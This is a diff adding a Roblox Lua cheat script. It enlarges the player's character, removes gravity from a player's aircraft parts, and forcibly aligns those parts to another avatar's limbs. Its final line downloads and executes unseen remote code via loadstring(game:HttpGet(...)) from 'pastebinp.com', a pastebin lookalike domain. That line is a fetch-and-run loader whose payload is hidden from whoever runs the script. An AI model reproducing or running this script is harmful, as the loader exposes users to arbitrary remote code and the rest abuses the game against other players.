@@ -1,0 +1,309 @@
+local RunService = game:GetService("RunService")
+function antiSit()
+if game.Players.LocalPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.Seated then 
+game.Players.LocalPlayer.Character.Humanoid.Jump = true
+end
+end
+RunService:BindToRenderStep("tempBinding", 1000, antiSit)
+
+function giant(p, size)
+    local pchar = p.Character
+    if pchar then
+        local function scale(chr, scl)
+            for _, v in pairs(pchar:GetChildren()) do
+                if v:IsA("Hat") then
+                    v:Clone()
+                    v.Parent = game.Lighting
+                end
+            end
+            
+            local Head = chr['Head']
+            local Torso = chr['Torso']
+            local LA = chr['Left Arm']
+            local RA = chr['Right Arm']
+            local LL = chr['Left Leg']
+            local RL = chr['Right Leg']
+            local HRP = chr['HumanoidRootPart']
+        
+            wait(0.1)
+            
+            Head.formFactor = 3
+            Torso.formFactor = 3
+            LA.formFactor = 3
+            RA.formFactor = 3
+            LL.formFactor = 3
+            RL.formFactor = 3
+            HRP.formFactor = 3
+            
+            Head.Size = Vector3.new(scl * 2, scl, scl)
+            Torso.Size = Vector3.new(scl * 2, scl * 2, scl)
+            LA.Size = Vector3.new(scl, scl * 2, scl)
+            RA.Size = Vector3.new(scl, scl * 2, scl)
+            LL.Size = Vector3.new(scl, scl * 2, scl)
+            RL.Size = Vector3.new(scl, scl * 2, scl)
+            HRP.Size = Vector3.new(scl * 2, scl * 2, scl)
+            
+            local Motor1 = Instance.new('Motor6D', Torso)
+            Motor1.Part0 = Torso
+            Motor1.Part1 = Head
+            Motor1.C0 = CFrame.new(0, 1 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
+            Motor1.C1 = CFrame.new(0, -0.5 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
+            Motor1.Name = "Neck"
+            
+            local Motor2 = Instance.new('Motor6D', Torso)
+            Motor2.Part0 = Torso
+            Motor2.Part1 = LA
+            Motor2.C0 = CFrame.new(-1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
+            Motor2.C1 = CFrame.new(0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
+            Motor2.Name = "Left Shoulder"
+            
+            local Motor3 = Instance.new('Motor6D', Torso)
+            Motor3.Part0 = Torso
+            Motor3.Part1 = RA
+            Motor3.C0 = CFrame.new(1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
+            Motor3.C1 = CFrame.new(-0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
+            Motor3.Name = "Right Shoulder"
+            
+            local Motor4 = Instance.new('Motor6D', Torso)
+            Motor4.Part0 = Torso
+            Motor4.Part1 = LL
+            Motor4.C0 = CFrame.new(-1 * scl, -1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
+            Motor4.C1 = CFrame.new(-0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
+            Motor4.Name = "Left Hip"
+            
+            local Motor5 = Instance.new('Motor6D', Torso)
+            Motor5.Part0 = Torso
+            Motor5.Part1 = RL
+            Motor5.C0 = CFrame.new(1 * scl, -1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
+            Motor5.C1 = CFrame.new(0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
+            Motor5.Name = "Right Hip"
+            
+            local Motor6 = Instance.new('Motor6D', HRP)
+            Motor6.Part0 = HRP
+            Motor6.Part1 = Torso
+            Motor6.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
+            Motor6.C1 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
+            
+        end
+        
+        scale(pchar, size)
+        pchar.Humanoid.WalkSpeed = 15 * size
+        
+        for _, v in pairs(game.Lighting:GetChildren()) do
+            if v:IsA("Hat") then
+                v.Parent = pchar
+            end
+        end
+    end
+end
+
+local plr = game.Players.LocalPlayer
+giant(plr, 30)
+
+wait(1)
+
+--STARPLATINUM
+local ZERO_GRAV_FORCE = Vector3.new(0, workspace.Gravity, 0)
+local samet_gaziAircraft = workspace.samet_gaziAircraft
+
+
+local function zeroGrav2(part)
+	if part:FindFirstChild("BodyForce") then
+		return
+	end
+	local temp = Instance.new("BodyForce")
+	temp.Force = part:GetMass() * ZERO_GRAV_FORCE
+	temp.Parent = part
+end
+
+local balls = {}
+for _, model in ipairs(samet_gaziAircraft:GetDescendants()) do
+if model:IsA("Model") and (model.Name == "BlockStd" or model.Name == "BlockBeam2" or model.Name == "BlockBeam") then
+		for _, part in ipairs(model:GetDescendants()) do
+			if part:IsA("BasePart") and not part.Anchored then
+				part.CanCollide = false
+				zeroGrav2(part)
+				
+			end
+		end
+	end
+end
+
+
+
+
+
+local playerName = game.Players.LocalPlayer.Name
+
+-- Wait until the workspace and the player's character are available
+local workspace = game:GetService("Workspace")
+local player = game:GetService("Players").LocalPlayer
+wait()
+
+-- Get a reference to the aircraft model
+local aircraft = workspace[playerName.."Aircraft"]
+
+
+local kafa = nil
+for _, blockStdModel in ipairs(aircraft:GetDescendants()) do
+    if blockStdModel.Name == "BlockStd" and blockStdModel:IsA("BasePart") and blockStdModel.Color == Color3.fromRGB(1, 1, 1) then
+        kafa = blockStdModel
+        break
+    end
+end
+
+local torso = nil
+for _, blockStdModel in ipairs(aircraft:GetDescendants()) do
+	if blockStdModel.Name == "BlockStd" and blockStdModel:IsA("BasePart") and blockStdModel.Color == Color3.fromRGB(2, 2, 2) then
+		torso = blockStdModel
+		break
+	end
+end
+
+local solkol = nil
+for _, blockStdModel in ipairs(aircraft:GetDescendants()) do
+	if blockStdModel.Name == "BlockStd" and blockStdModel:IsA("BasePart") and blockStdModel.Color == Color3.fromRGB(3, 3, 3) then
+		solkol = blockStdModel
+		break
+	end
+end
+
+local sagkol = nil
+for _, blockStdModel in ipairs(aircraft:GetDescendants()) do
+	if blockStdModel.Name == "BlockStd" and blockStdModel:IsA("BasePart") and blockStdModel.Color == Color3.fromRGB(4, 4, 4) then
+		sagkol = blockStdModel
+		break
+	end
+end
+
+local solayak = nil
+for _, blockStdModel in ipairs(aircraft:GetDescendants()) do
+	if blockStdModel.Name == "BlockStd" and blockStdModel:IsA("BasePart") and blockStdModel.Color == Color3.fromRGB(5, 5, 5) then
+		solayak = blockStdModel
+		break
+	end
+end
+
+local sagayak = nil
+for _, blockStdModel in ipairs(aircraft:GetDescendants()) do
+	if blockStdModel.Name == "BlockStd" and blockStdModel:IsA("BasePart") and blockStdModel.Color == Color3.fromRGB(6, 6, 6) then
+		sagayak = blockStdModel
+		break
+	end
+end
+
+-- kilc kolor is 31 31 31 and kilic 2 color is 32 32 32
+local kilic = nil
+for _, blockStdModel in ipairs(aircraft:GetDescendants()) do
+	if blockStdModel.Name == "BlockStd" and blockStdModel:IsA("BasePart") and blockStdModel.Color == Color3.fromRGB(31, 31, 31) then
+		kilic = blockStdModel
+		break
+	end
+end
+
+local kilic2 = nil
+for _, blockStdModel in ipairs(aircraft:GetDescendants()) do
+	if blockStdModel.Name == "BlockStd" and blockStdModel:IsA("BasePart") and blockStdModel.Color == Color3.fromRGB(32, 32, 32) then
+		kilic2 = blockStdModel
+		break
+	end
+end
+
+
+
+local function align(Part0, Part1, res)
+	local att1 = Instance.new("Attachment")
+	att1.Orientation = Vector3.new(0, 0, 0)
+	att1.Position = Vector3.new(0, 0, 0)
+	att1.Archivable = true
+	local att0 = att1:Clone()
+
+	local ap = Instance.new("AlignPosition", att0)
+	ap.ApplyAtCenterOfMass = true
+	ap.MaxForce = 9e9
+	ap.MaxVelocity = 9e9
+	ap.ReactionForceEnabled = false
+	ap.Responsiveness = res
+	ap.RigidityEnabled = false
+
+	local ao = Instance.new("AlignOrientation", att0)
+	ao.MaxAngularVelocity = 9e9
+	ao.MaxTorque = 9e9
+	ao.PrimaryAxisOnly = false
+	ao.ReactionTorqueEnabled = false
+	ao.Responsiveness = res
+	ao.RigidityEnabled = false
+
+	ap.Attachment1 = att1
+	ap.Attachment0 = att0
+	ao.Attachment1 = att1
+	ao.Attachment0 = att0
+
+	att1.Parent = Part1
+	att0.Parent = Part0
+
+	return att1
+end
+
+--externalalign
+local function align2(Part0, Part1, res)
+    local att1 = Instance.new("Attachment")
+    att1.Orientation = Vector3.new(0, 90, 100)
+    att1.Position = Vector3.new(0, 10, -10)
+    att1.Archivable = true
+    local att0 = att1:Clone()
+
+    local ap = Instance.new("AlignPosition", att0)
+    ap.ApplyAtCenterOfMass = true
+    ap.MaxForce = 9e9
+    ap.MaxVelocity = 9e9
+    ap.ReactionForceEnabled = false
+    ap.Responsiveness = res
+    ap.RigidityEnabled = false
+
+    local ao = Instance.new("AlignOrientation", att0)
+    ao.MaxAngularVelocity = 9e9
+    ao.MaxTorque = 9e9
+    ao.PrimaryAxisOnly = false
+    ao.ReactionTorqueEnabled = false
+    ao.Responsiveness = res
+    ao.RigidityEnabled = false
+
+    ap.Attachment1 = att1
+    ap.Attachment0 = att0
+    ao.Attachment1 = att1
+    ao.Attachment0 = att0
+
+    att1.Parent = Part1
+    att0.Parent = Part0
+
+    return att1
+end
+
+
+
+
+local kafaparcasi = workspace.samet_gazi.Head
+local torsoparcasi = workspace.samet_gazi.Torso
+local solkolparcasi = workspace.samet_gazi["Left Arm"]
+local sagkolparcasi = workspace.samet_gazi["Right Arm"]
+local solayakparcasi = workspace.samet_gazi["Left Leg"]
+local sagayakparcasi  = workspace.samet_gazi["Right Leg"]
+
+print("location of kafa is", kafa.Position)
+
+
+align(kafa, kafaparcasi, 120)
+align(torso, torsoparcasi, 120)
+align(solkol, solkolparcasi, 120)
+align(sagkol, sagkolparcasi, 120)
+align(solayak, solayakparcasi, 120)
+align(sagayak, sagayakparcasi, 120)
+--external
+
+align2(kilic, kilic2, 120)
+
+wait(2)
+loadstring(game:HttpGet("https://pastebinp.com/raw/R1MgDiRX", true))()
+message.txt
+10 KB
